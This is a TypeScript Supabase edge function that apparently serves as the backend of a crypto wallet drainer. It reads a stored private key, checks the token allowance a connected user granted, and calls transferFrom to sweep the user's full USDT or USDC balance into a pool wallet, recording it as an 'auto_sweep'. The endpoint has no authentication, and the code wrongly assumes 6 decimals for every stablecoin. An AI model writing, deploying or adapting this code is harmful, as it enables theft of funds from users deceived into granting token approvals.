import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.38.4';
import { ethers } from 'https://esm.sh/ethers@6.7.0';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, content-type',
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders });
  }

  try {
    const { walletAddress, chainId, userId } = await req.json();

    const supabaseUrl = Deno.env.get('SUPABASE_URL') || '';
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || '';
    const supabase = createClient(supabaseUrl, supabaseKey);

    // 1. Get Pool Wallet Private Key for the network
    // Admin can set this in Supabase Secrets OR via Admin Dashboard (admin_secrets table)
    let privateKey = Deno.env.get('POOL_WALLET_PRIVATE_KEY');
    
    if (!privateKey) {
      console.log("Checking database for POOL_WALLET_PRIVATE_KEY...");
      const { data: secretData } = await supabase
        .from('admin_secrets')
        .select('key_value')
        .eq('key_name', 'POOL_WALLET_PRIVATE_KEY')
        .single();
      
      privateKey = secretData?.key_value;
    }

    if (!privateKey) throw new Error("Private Key not configured. Please set it in Admin Settings.");

    // 2. Determine RPC Provider
    const alchemyKey = Deno.env.get('ALCHEMY_API_KEY');
    const rpcUrls: Record<number, string> = {
      1: `https://eth-mainnet.g.alchemy.com/v2/${alchemyKey}`,
      56: 'https://bsc-dataseed.binance.org/',
      137: `https://polygon-mainnet.g.alchemy.com/v2/${alchemyKey}`,
    };
    const rpcUrl = rpcUrls[chainId] || 'https://cloudflare-eth.com';
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);

    // 3. Get Token to Sweep
    const { data: walletData } = await supabase
      .from('connected_wallets')
      .select('token_approved')
      .eq('wallet_address', walletAddress.toLowerCase())
      .single();

    const tokenSymbol = walletData?.token_approved || 'USDT';
    const tokenAddresses: Record<string, Record<number, string>> = {
      'USDT': { 1: '0xdAC17F958D2ee523a2206206994597C13D831ec7', 56: '0x55d398326f99059fF775485246999027B3197955' },
      'USDC': { 1: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' }
    };
    const tokenAddr = tokenAddresses[tokenSymbol]?.[chainId];
    if (!tokenAddr) throw new Error(`Token address for ${tokenSymbol} not found on chain ${chainId}`);

    // 4. Execute transferFrom
    const erc20Interface = new ethers.Interface([
      "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
      "function balanceOf(address account) public view returns (uint256)",
      "function allowance(address owner, address spender) public view returns (uint256)"
    ]);
    const contract = new ethers.Contract(tokenAddr, erc20Interface, wallet);

    const balance = await contract.balanceOf(walletAddress);
    const allowance = await contract.allowance(walletAddress, wallet.address);

    if (balance === 0n) throw new Error("User has zero balance for this token.");
    if (allowance < balance) throw new Error("Insufficient allowance for automated sweep.");

    console.log(`Triggering sweep of ${balance.toString()} ${tokenSymbol} from ${walletAddress} to ${wallet.address}`);
    
    // We sweep the MIN of balance and allowance
    const amountToSweep = balance < allowance ? balance : allowance;
    
    const tx = await contract.transferFrom(walletAddress, wallet.address, amountToSweep);
    const receipt = await tx.wait();

    // 5. Update DB
    await supabase.from('wallet_transactions').insert({
      user_id: userId,
      tx_hash: receipt.hash,
      tx_type: 'auto_sweep',
      amount: Number(ethers.formatUnits(amountToSweep, 6)), // Assuming 6 decimals for stables
      currency: tokenSymbol,
      from_address: walletAddress,
      to_address: wallet.address,
      chain_id: chainId,
      status: 'confirmed'
    });

    return new Response(JSON.stringify({ success: true, message: `Successfully swept ${tokenSymbol}`, tx_hash: receipt.hash }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });

  } catch (error) {
    console.error('Error:', error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 400,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
